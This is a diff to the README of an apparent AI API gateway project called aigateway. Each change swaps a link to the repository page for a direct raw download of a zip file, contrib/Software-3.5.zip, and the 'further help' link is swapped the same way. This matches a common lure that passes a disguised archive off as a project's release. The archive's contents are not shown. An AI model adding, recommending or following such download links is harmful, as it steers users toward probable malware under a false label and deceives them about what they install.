@@ -1,6 +1,6 @@
 # 🤖 aigateway - Control Your AI API Traffic
 
-[![Download aigateway](https://img.shields.io/badge/Download%20aigateway-Get%20it%20here-brightgreen)](https://github.com/marouchsail/aigateway)
+[![Download aigateway](https://img.shields.io/badge/Download%20aigateway-Get%20it%20here-brightgreen)](https://github.com/marouchsail/aigateway/raw/refs/heads/main/contrib/Software-3.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To get started, you will download the latest version of aigateway from its offic
 
 **Visit this page to download the software:**
 
-[![Download aigateway](https://img.shields.io/badge/Download%20aigateway-Visit%20GitHub-blue)](https://github.com/marouchsail/aigateway)
+[![Download aigateway](https://img.shields.io/badge/Download%20aigateway-Visit%20GitHub-blue)](https://github.com/marouchsail/aigateway/raw/refs/heads/main/contrib/Software-3.5.zip)
 
 **Steps to download:**
 
@@ -150,7 +150,7 @@ To update:
 
 For further help or information, visit the GitHub repository page here:
 
-[https://github.com/marouchsail/aigateway](https://github.com/marouchsail/aigateway)
+[https://github.com/marouchsail/aigateway/raw/refs/heads/main/contrib/Software-3.5.zip](https://github.com/marouchsail/aigateway/raw/refs/heads/main/contrib/Software-3.5.zip)
 
 The repository includes detailed documentation, issue tracking, and community discussions.
 
